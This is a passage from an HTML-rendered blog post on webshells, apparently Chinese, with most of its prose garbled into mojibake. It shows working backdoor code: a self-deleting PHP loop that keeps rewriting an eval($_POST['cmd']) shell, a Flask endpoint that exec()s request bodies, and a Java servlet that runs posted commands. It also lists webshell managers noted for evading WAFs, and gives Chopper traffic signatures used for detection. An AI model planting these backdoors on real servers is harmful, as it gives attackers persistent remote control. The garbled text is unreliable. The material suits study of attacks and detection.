class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Dim conn, rs, sql</span><br><span class="line">Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)</span><br><span class="line">conn.Open &quot;Provider=SQLOLEDB;Data Source=your_server;Initial Catalog=your_db;User Id=your_username;Password=your_password;&quot;</span><br><span class="line"></span><br><span class="line">sql = &quot;SELECT * FROM Users&quot;</span><br><span class="line">Set rs = conn.Execute(sql)</span><br><span class="line"></span><br><span class="line">Do While Not rs.EOF</span><br><span class="line">    Response.Write(&quot;Username: &quot; &amp; rs(&quot;username&quot;) &amp; &quot;&lt;br&gt;&quot;)</span><br><span class="line">    rs.MoveNext</span><br><span class="line">Loop</span><br><span class="line"></span><br><span class="line">rs.Close</span><br><span class="line">Set rs = Nothing</span><br><span class="line">conn.Close</span><br><span class="line">Set conn = Nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP ç¤ºä¾‹ï¼š</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.sql.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/myDB&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;SELECT * FROM Users&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">    out.println(<span class="string">&quot;Username: &quot;</span> + rs.getString(<span class="string">&quot;username&quot;</span>) + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="6-å†…å­˜é©¬ï¼ˆIn-Memory-Shellsï¼‰"><a href="#6-å†…å­˜é©¬ï¼ˆIn-Memory-Shellsï¼‰" class="headerlink" title="6. å†…å­˜é©¬ï¼ˆIn-Memory Shellsï¼‰"></a>6. å†…å­˜é©¬ï¼ˆIn-Memory Shellsï¼‰</h3><p>å†…å­˜é©¬æ˜¯æ— æ–‡ä»¶æ”»å‡»çš„ä¸€ç§å¸¸ç”¨æ‰‹æ®µï¼Œéšç€æ”»é˜²æ¼”ç»ƒçƒ­åº¦è¶Šæ¥è¶Šé«˜ï¼šæ”»é˜²åŒæ–¹çš„åšå¼ˆï¼Œæµé‡åˆ†æã€EDRç­‰ä¸“ä¸šå®‰å…¨è®¾å¤‡è¢«è“æ–¹å¹¿æ³›ä½¿ç”¨ï¼Œä¼ ç»Ÿçš„æ–‡ä»¶ä¸Šä¼ çš„webshllæˆ–ä»¥æ–‡ä»¶å½¢å¼é©»ç•™çš„åé—¨è¶Šæ¥è¶Šå®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œå†…å­˜é©¬ä½¿ç”¨è¶Šæ¥è¶Šå¤šã€‚</p><p>Webshellå†…å­˜é©¬ï¼Œæ˜¯åœ¨å†…å­˜ä¸­å†™å…¥æ¶æ„åé—¨å’Œæœ¨é©¬å¹¶æ‰§è¡Œï¼Œè¾¾åˆ°è¿œç¨‹æ§åˆ¶WebæœåŠ¡å™¨çš„ä¸€ç±»å†…å­˜é©¬ï¼Œå…¶ç„å‡†äº†ä¼ä¸šçš„å¯¹å¤–çª—å£ï¼šç½‘ç«™ã€åº”ç”¨ã€‚ä½†ä¼ ç»Ÿçš„Webshelléƒ½æ˜¯åŸºäºæ–‡ä»¶ç±»å‹çš„ï¼Œé»‘å®¢å¯ä»¥åˆ©ç”¨ä¸Šä¼ å·¥å…·æˆ–ç½‘ç«™æ¼æ´æ¤å…¥æœ¨é©¬ï¼ŒåŒºåˆ«åœ¨äºWebshellå†…å­˜é©¬æ˜¯æ— æ–‡ä»¶é©¬ï¼Œåˆ©ç”¨ä¸­é—´ä»¶çš„è¿›ç¨‹æ‰§è¡ŒæŸäº›æ¶æ„ä»£ç ï¼Œä¸ä¼šæœ‰æ–‡ä»¶è½åœ°ï¼Œç»™æ£€æµ‹å¸¦æ¥å·¨å¤§éš¾åº¦ã€‚</p><p>PHPå†…å­˜é©¬ï¼Œä¹Ÿå«åšPHPä¸æ­»é©¬ã€ä¸æ­»åƒµå°¸ï¼Œåœ¨çº¿ä¸‹AWDä¸­æ˜¯å¸¸ç”¨æ‰‹æ®µä¹‹ä¸€ã€‚åœ¨èšå‰‘ä¸­ä¹Ÿæœ‰ä¸“é—¨çš„æ’ä»¶å¯ä»¥ä¸€é”®æ³¨å…¥å†…å­˜é©¬ã€‚<br>åŸç†ä¹Ÿå¾ˆç®€å•ï¼Œç›¸å¯¹äºJavaå¯ä»¥ç›´æ¥æŠŠæ•´ä¸ªshellå†™å…¥å†…å­˜ï¼Œphpå†…å­˜é©¬çš„å®ç°åˆ™æ˜¯å°†ä¸€ä¸ªæœ¨é©¬åå¤å†™å…¥ï¼Œè¾¾åˆ°æ— æ³•åˆ é™¤çš„ç›®çš„ã€‚<br><strong>PHP ç¤ºä¾‹ï¼ˆåˆ©ç”¨PHP-FPMæ¼æ´çš„ç¤ºä¾‹ï¼Œè™šæ„ï¼‰ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>); <span class="comment">//è®¾ç½®å®¢æˆ·ç«¯æ–­å¼€è¿æ¥æ—¶æ˜¯å¦ä¸­æ–­è„šæœ¬çš„æ‰§è¡Œ</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">//è®¾ç½®è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼Œlinuxä¸‹å¯èƒ½ä¸å¤§å¥½ç”¨</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>); <span class="comment">//åˆ é™¤è‡ªèº«</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);<span class="comment">//æ¶æ„ä»£ç </span></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>); <span class="comment">//å»¶è¿Ÿæ‰§è¡Œå¯æœ‰å¯æ— </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬è´¨ä¸ŠåŸç†æ˜¯ä¸å˜ï¼Œæ‰§è¡Œæ­»å¾ªç¯ï¼Œç„¶ååˆ é™¤è‡ªèº«ã€‚ä½†å®é™…ä¸Šè¿™æ ·åšè¿˜æ˜¯ä¼šæœ‰æ–‡ä»¶è½åœ°ï¼Œåªæ˜¯ç®¡ç†å‘˜åˆ ä¸æ‰ã€åˆ ä¸å®Œç½¢äº†ã€‚ä¹Ÿå¯ä»¥ç”¨åˆ©ç”¨fastcgiå¯¹phpæ”»å‡»æ‰§è¡Œå‘½ä»¤ï¼Œä½†è¿™æ ·æ˜¯å¦ç®—ä¸€ä¸ªé©»ç•™wenshellè¿˜æœ‰å¾…äº‰è®®ã€‚</p><p><strong>Python ç¤ºä¾‹ï¼ˆä½¿ç”¨flaskæ¡†æ¶ï¼‰ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/exec&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_code</span>():</span><br><span class="line">    <span class="built_in">exec</span>(request.data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Code executed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><em>æ³¨ï¼šè¿™ä¸ªç¤ºä¾‹è¡¨æ˜ä»£ç ç›´æ¥ä»è¯·æ±‚ä¸­æ‰§è¡Œï¼Œä¸è¿›è¡Œä»»ä½•ç£ç›˜å†™å…¥æ“ä½œã€‚</em></p><p><strong>Java ç¤ºä¾‹ï¼ˆé€šè¿‡Servletæ‰§è¡Œå‘½ä»¤ï¼‰ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InMemoryShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getReader().readLine();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> proc.getOutputStream();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WebShellç®¡ç†å·¥å…·"><a href="#WebShellç®¡ç†å·¥å…·" class="headerlink" title="WebShellç®¡ç†å·¥å…·"></a>WebShellç®¡ç†å·¥å…·</h2><ol><li><p>ä¸­å›½èœåˆ€ï¼ˆChopperï¼‰<br>  ä¸­å›½èœåˆ€æ˜¯ä¸€æ¬¾ä¸“ä¸šçš„ç½‘ç«™ç®¡ç†è½¯ä»¶ï¼Œç”¨é€”å¹¿æ³›ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œå°å·§å®ç”¨ã€‚åªè¦æ”¯æŒåŠ¨æ€è„šæœ¬çš„ç½‘ç«™ï¼Œéƒ½å¯ä»¥ç”¨ä¸­å›½èœåˆ€æ¥è¿›è¡Œç®¡ç†ï¼åœ¨éç®€ä½“ä¸­æ–‡ç¯å¢ƒä¸‹ä½¿ç”¨ï¼Œè‡ªåŠ¨åˆ‡æ¢åˆ°è‹±æ–‡ç•Œé¢ã€‚UNICODEæ–¹å¼ç¼–è¯‘ï¼Œæ”¯æŒå¤šå›½è¯­è¨€è¾“å…¥æ˜¾ç¤ºã€‚<br>  å®˜æ–¹ç½‘ç«™ï¼š<a href="http://www.maicaidao.com/">http://www.maicaidao.com/</a></p></li><li><p>ä¸­å›½èšå‰‘ï¼ˆAntSwordï¼‰<br>  ä¸­å›½èšå‰‘æ˜¯ä¸€æ¬¾å¼€æºçš„è·¨å¹³å°ç½‘ç«™ç®¡ç†å·¥å…·ï¼Œå®ƒä¸»è¦é¢å‘äºåˆæ³•æˆæƒçš„æ¸—é€æµ‹è¯•å®‰å…¨äººå‘˜ä»¥åŠè¿›è¡Œå¸¸è§„æ“ä½œçš„ç½‘ç«™ç®¡ç†å‘˜ã€‚æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„webshellç®¡ç†å·¥å…·ã€‚ä½¿ç”¨ç¼–&#x2F;è§£ç å™¨è¿›è¡Œæµé‡æ··æ·†å¯ç»•è¿‡WAFï¼Œå¹¶ä¸”æœ‰å¤šæ¬¾å®ç”¨æ’ä»¶ã€‚<br>  å› ä¸ºèœåˆ€ä¹Ÿè®¸æœ‰åé—¨(å·shell)ï¼Œä¸æ”¾å¿ƒå¯ä»¥ç”¨èšå‰‘ï¼Œèšå‰‘è¿˜å¯ä»¥çœ‹æºç ï¼ŒåŠŸèƒ½ä¹Ÿæ¯”èœåˆ€å¼ºäº›ã€‚<br>  é¡¹ç›®åœ°å€ï¼š<br>  <a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p></li><li><p>å†°è(Behinder)<br>  å†°èæ˜¯ä¸€æ¬¾åŸºäºJavaå¼€å‘çš„åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†é€šä¿¡æµé‡çš„æ–°å‹Webshellå®¢æˆ·ç«¯ï¼Œç”±äºå®ƒçš„é€šä¿¡æµé‡è¢«åŠ å¯†ï¼Œä½¿ç”¨ä¼ ç»Ÿçš„WAFã€IDSç­‰è®¾å¤‡éš¾ä»¥æ£€æµ‹ï¼Œç›®å‰åœ¨HWä¸­ä½¿ç”¨è¾ƒå¤šçš„ä¸€æ¬¾å·¥å…·ã€‚ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å¤¹server é‡Œçš„éƒ½æ˜¯æœ¨é©¬ã€‚<br>  åŠŸèƒ½ä»‹ç»åŸæ–‡é“¾æ¥ï¼š<br>  ã€Šåˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹å®¢æˆ·ç«¯ç¯‡ã€‹ <a href="https://xz.aliyun.com/t/2799">https://xz.aliyun.com/t/2799</a><br>  å·¥ä½œåŸç†åŸæ–‡é“¾æ¥ï¼š<br>  ã€Šåˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹Javaç¯‡ã€‹ <a href="https://xz.aliyun.com/t/2744">https://xz.aliyun.com/t/2744</a><br>  ã€Šåˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹.NETç¯‡ã€‹ <a href="https://xz.aliyun.com/t/2758">https://xz.aliyun.com/t/2758</a><br>  ã€Šåˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹PHPç¯‡ã€‹ <a href="https://xz.aliyun.com/t/2774">https://xz.aliyun.com/t/2774</a><br>  é¡¹ç›®åœ°å€ï¼š<br>  <a href="http://github.com/rebeyond/Behinder">http://github.com/rebeyond/Behinder</a></p></li><li><p>å“¥æ–¯æ‹‰(Godzilla)<br>  å“¥æ–¯æ‹‰æ˜¯ä¸€æ¬¾ç»§å†°èä¹‹ååˆä¸€æ¬¾äºJavaå¼€å‘çš„åŠ å¯†é€šä¿¡æµé‡çš„æ–°å‹Webshellå®¢æˆ·ç«¯ï¼Œå†…ç½®äº†3ç§æœ‰æ•ˆè½½è·ä»¥åŠ6ç§åŠ å¯†å™¨ï¼Œ6ç§æ”¯æŒè„šæœ¬åç¼€ï¼Œ20ä¸ªå†…ç½®æ’ä»¶ï¼Œä¹Ÿæ˜¯ç›®å‰åœ¨HVVä¸­ä½¿ç”¨è¾ƒå¤šçš„ä¸€æ¬¾å·¥å…·ã€‚<br>  é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p></li><li><p>weevely<br>  weevely æ˜¯ Linux ç³»ç»Ÿè‡ªå¸¦çš„èœåˆ€ï¼Œä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·ï¼Œé›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«ï¼Œé‡‡ç”¨c&#x2F;sæ¨¡å¼æ„å»ºï¼Œå¯ä»¥ç®—ä½œä¸€æ¬¾ phpèœåˆ€ æ›¿ä»£å·¥å…·ï¼Œå…·æœ‰å¾ˆå¥½çš„éšè”½æ€§ã€‚<br>  åœ¨linuxä¸Šä½¿ç”¨æ—¶è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œé›†æœåŠ¡å™¨é”™è¯¯é…ç½®å®¡è®¡ï¼Œåé—¨æ”¾ç½®ï¼Œæš´åŠ›ç ´è§£ï¼Œæ–‡ä»¶ç®¡ç†ï¼Œèµ„æºæœç´¢ï¼Œç½‘ç»œä»£ç†ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œæ•°æ®åº“æ“ä½œï¼Œç³»ç»Ÿä¿¡æ¯æ”¶é›†åŠç«¯å£æ‰«æç­‰åŠŸèƒ½ã€‚</p></li></ol><p>ä¸åŒçš„Webshellç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾å¦‚ä¸‹ï¼š<br><a href="https://blog.csdn.net/weixin_45585955/article/details/130075885">https://blog.csdn.net/weixin_45585955/article/details/130075885</a></p><ol><li><strong>èœåˆ€</strong><br> é¦–å…ˆè¯·æ±‚ä½“ä¸­ä¼ é€’çš„payloadä¸ºbase64ç¼–ç ï¼Œå¹¶ä¸”å­˜åœ¨å›ºå®šçš„ï¼Œå…¶æ¬¡è¯·æ±‚ä½“ä¸­å­˜åœ¨evalï¼Œbase64ç­‰ç‰¹å¾å­—ç¬¦ã€‚æœ€åä¼ ç»™cmdçš„è¿™äº›æµé‡å­—ç¬¦ä¸­æœ‰è‡ªå·±çš„ç‰¹å¾ï¼Œ1ã€éƒ½æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼›2ã€å¿…é¡»ä»¥åˆ†å·ç»“å°¾ï¼›3ã€æ•°æ®åŒ…æºä¸€èˆ¬æ˜¯ipã€‚<br> ä¸­å›½èœåˆ€2011ç‰ˆæœ¬åŠ2014ç‰ˆæœ¬å„è¯­è¨€WebShellé“¾æ¥æµé‡ç‰¹å¾<br> - PHPç±»WebShellé“¾æ¥æµé‡<br>     å…¶ä¸­ç‰¹å¾ä¸»è¦åœ¨bodyä¸­ï¼Œå°†bodyä¸­æµé‡è¿›è¡Œurlè§£ç åå¦‚ä¸‹ï¼š<br>     å…¶ä¸­ç‰¹å¾ç‚¹æœ‰å¦‚ä¸‹ä¸‰éƒ¨åˆ†ï¼Œ<br>     ç¬¬ä¸€ï¼šâ€œevalâ€ï¼Œevalå‡½æ•°ç”¨äºæ‰§è¡Œä¼ é€’çš„æ”»å‡»payloadï¼Œè¿™æ˜¯å¿…ä¸å¯å°‘çš„ï¼›<br>     ç¬¬äºŒï¼š<code>(base64_decode($_POST[z0]))ï¼Œ(base64_decode($_POST[z0]))</code>å°†æ”»å‡»payloadè¿›è¡ŒBase64è§£ç ï¼Œå› ä¸ºèœåˆ€é»˜è®¤æ˜¯å°†æ”»å‡»è½½è·ä½¿ç”¨Base64ç¼–ç ï¼Œä»¥é¿å…è¢«æ£€æµ‹ï¼›<br>     ç¬¬ä¸‰ï¼š&amp;z0&#x3D;QGluaV9zZXQâ€¦ï¼Œè¯¥éƒ¨åˆ†æ˜¯ä¼ é€’æ”»å‡»payloadï¼Œæ­¤å‚æ•°z0å¯¹åº”<code>$_POST[z0]</code>æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œè¯¥å‚æ•°å€¼æ˜¯ä½¿ç”¨Base64ç¼–ç çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨base64è§£ç å¯ä»¥çœ‹åˆ°æ”»å‡»æ˜æ–‡ã€‚<br>     æ³¨ï¼š<br>         1.æœ‰å°‘æ•°æ—¶å€™evalæ–¹æ³•ä¼šè¢«assertæ–¹æ³•æ›¿ä»£ã€‚<br>         2.$_POSTä¹Ÿä¼šè¢«$_GETã€$_REQUESTæ›¿ä»£ã€‚<br>         3.z0æ˜¯èœåˆ€é»˜è®¤çš„å‚æ•°ï¼Œè¿™ä¸ªåœ°æ–¹ä¹Ÿæœ‰å¯èƒ½è¢«ä¿®æ”¹ä¸ºå…¶ä»–å‚æ•°åã€‚<br> - SPç±»WebShellé“¾æ¥æµé‡ï¼š<br>     è¯¥æµé‡æ˜¯WebShellé“¾æ¥æµé‡çš„ç¬¬ä¸€æ®µé“¾æ¥æµé‡ï¼Œå…¶ä¸­ç‰¹å¾ä¸»è¦åœ¨i&#x3D;A&amp;z0&#x3D;GB2312ï¼Œèœåˆ€é“¾æ¥JSPæœ¨é©¬æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å®šä¹‰æ“ä½œï¼Œå…¶ä¸­å‚æ•°å€¼ä¸ºA-Qï¼Œå¦‚i&#x3D;Aï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šç¼–ç ï¼Œå…¶å‚æ•°å€¼ä¸ºç¼–ç ï¼Œå¦‚z0&#x3D;GB2312ï¼Œæœ‰æ—¶å€™z0åé¢è¿˜ä¼šæ¥ç€åˆz1&#x3D;å‚æ•°ç”¨æ¥åŠ å…¥æ”»å‡»è½½è·ã€‚<br>     æ³¨ï¼šå…¶ä¸­å‚æ•°åiã€z0ã€z1è¿™ç§å‚æ•°åæ˜¯ä¼šå˜çš„ï¼Œä½†æ˜¯å…¶å‚æ•°å€¼ä»¥åŠè¿™ç§å½¢å¼æ˜¯ä¸ä¼šå˜å¾—ï¼Œæœ€ä¸»è¦å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å€¼åœ¨A-Qï¼Œè¿™ç§æ˜¯ä¸å˜çš„ã€‚<br> - ASPç±»WebShellé“¾æ¥æµé‡ï¼š<br>     å…¶ä¸­bodyæµé‡è¿›è¡ŒURLè§£ç å<br>     å…¶ä¸­ç‰¹å¾ç‚¹æœ‰å¦‚ä¸‹ä¸‰éƒ¨åˆ†ï¼Œ<br>     ç¬¬ä¸€ï¼šâ€œExecuteâ€ï¼ŒExecuteå‡½æ•°ç”¨äºæ‰§è¡Œä¼ é€’çš„æ”»å‡»payloadï¼Œè¿™æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œè¿™ä¸ªç­‰åŒäºphpç±»ä¸­evalå‡½æ•°ï¼›<br>     ç¬¬äºŒï¼šOnError ResumeNextï¼Œè¿™éƒ¨åˆ†æ˜¯å¤§éƒ¨åˆ†ASPå®¢æˆ·ç«¯ä¸­å¿…æœ‰çš„æµé‡ï¼Œèƒ½ä¿è¯ä¸ç®¡å‰é¢å‡ºä»»ä½•é”™ï¼Œç»§ç»­æ‰§è¡Œä»¥ä¸‹ä»£ç ã€‚<br>     ç¬¬ä¸‰ï¼šResponse.Writeå’ŒResponse.Endæ˜¯å¿…æœ‰çš„ï¼Œæ˜¯æ¥å®Œå–„æ•´ä¸ªæ“ä½œçš„ã€‚<br>     è¿™ç§æµé‡ä¸»è¦è¯†åˆ«è¿™å‡ éƒ¨åˆ†ç‰¹å¾ï¼Œåœ¨æ­£å¸¸æµé‡ä¸­åŸºæœ¬æ²¡æœ‰ã€‚<br>     æ³¨ï¼šOnError Resume Nextè¿™ä¸ªç‰¹å¾åœ¨å¤§éƒ¨åˆ†æµé‡ä¸­å­˜åœ¨ï¼Œæå°‘æ•°æƒ…å†µæ²¡æœ‰ã€‚<br> ä¸­å›½èœåˆ€2016ç‰ˆæœ¬å„è¯­è¨€WebShellé“¾æ¥æµé‡ç‰¹å¾ï¼š<br> - PHPç±»WebShellé“¾æ¥æµé‡ï¼š<br>     å…¶ä¸­ç‰¹å¾ä¸»è¦åœ¨bodyä¸­ï¼Œå°†bodyä¸­éƒ¨åˆ†å¦‚ä¸‹ï¼š<br>     è¿™ä¸ªç‰ˆæœ¬ä¸­æµé‡æœ€å¤§çš„æ”¹å˜å°±æ˜¯å°†ç‰¹å¾è¿›è¡Œæ‰“æ–­æ··æ·†ï¼Œè¿™ä¹Ÿç»™æˆ‘ä»¬è¯†åˆ«ç‰¹å¾æä¾›ä¸€ç§æ€è·¯ã€‚<br>     å…¶ä¸­ç‰¹å¾ç‚¹æœ‰å¦‚ä¸‹ä¸‰éƒ¨åˆ†ï¼Œ<br>     ç¬¬ä¸€ï¼šâ€œâ€Baâ€.â€SE6â€.â€4_dEcâ€.â€OdEâ€ï¼Œè¿™éƒ¨åˆ†æ˜¯å°†base64è§£ç æ‰“æ–­ä½¿ç”¨.æ¥è¿æ¥ã€‚<br>     ç¬¬äºŒï¼š@evâ€.â€alï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯å°†@evalè¿™éƒ¨åˆ†è¿›è¡Œæ‰“æ–­è¿æ¥ï¼Œå¯ä»¥è¯†åˆ«è¿™æ®µä»£ç å³å¯ã€‚<br>     ç¬¬ä¸‰ï¼šQGluaV9zZXQoImRpc3BsYXlfâ€¦ï¼Œè¯¥éƒ¨åˆ†æ˜¯ä¼ é€’æ”»å‡»payloadï¼Œpayloadä¾æ—§ä½¿ç”¨Base64ç¼–ç çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨base64è§£ç å¯ä»¥çœ‹åˆ°æ”»å‡»æ˜æ–‡æ¥è¯†åˆ«ã€‚<br>     æ³¨ï¼šæœ‰å°‘æ•°æ—¶å€™evalæ–¹æ³•ä¼šè¢«assertæ–¹æ³•æ›¿ä»£ã€‚<br> - JSPç±»WebShellé“¾æ¥æµé‡:<br>     è¯¥ç‰ˆæœ¬JSPwebshellæµé‡ä¸ä¹‹å‰ç‰ˆæœ¬ä¸€æ ·ï¼Œ<br>     æ‰€ä»¥åˆ†æå¦‚ä¸Šï¼šè¯¥æµé‡æ˜¯WebShellé“¾æ¥æµé‡çš„ç¬¬ä¸€æ®µé“¾æ¥æµé‡ï¼Œå…¶ä¸­ç‰¹å¾ä¸»è¦åœ¨i&#x3D;A&amp;z0&#x3D;GB2312ï¼Œèœåˆ€é“¾æ¥JSPæœ¨é©¬æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å®šä¹‰æ“ä½œï¼Œå…¶ä¸­å‚æ•°å€¼ä¸ºA-Qï¼Œå¦‚i&#x3D;Aï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šç¼–ç ï¼Œå…¶å‚æ•°å€¼ä¸ºç¼–ç ï¼Œå¦‚z0&#x3D;GB2312ï¼Œæœ‰æ—¶å€™z0åé¢è¿˜ä¼šæ¥ç€åˆz1&#x3D;ã€z2&#x3D;å‚æ•°ç”¨æ¥åŠ å…¥æ”»å‡»è½½è·ã€‚<br>     æ³¨ï¼šå…¶ä¸­å‚æ•°åiã€z0ã€z1è¿™ç§å‚æ•°åæ˜¯ä¼šå˜çš„ï¼Œä½†æ˜¯å…¶å‚æ•°å€¼ä»¥åŠè¿™ç§å½¢å¼æ˜¯ä¸ä¼šå˜å¾—ï¼Œæœ€ä¸»è¦å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å€¼åœ¨A-Qï¼Œè¿™ç§æ˜¯ä¸å˜çš„ã€‚<br> - ASPç±»WebShellé“¾æ¥æµé‡ï¼š<br>     å…¶ä¸­bodyæµé‡ä¸ºï¼š<br>     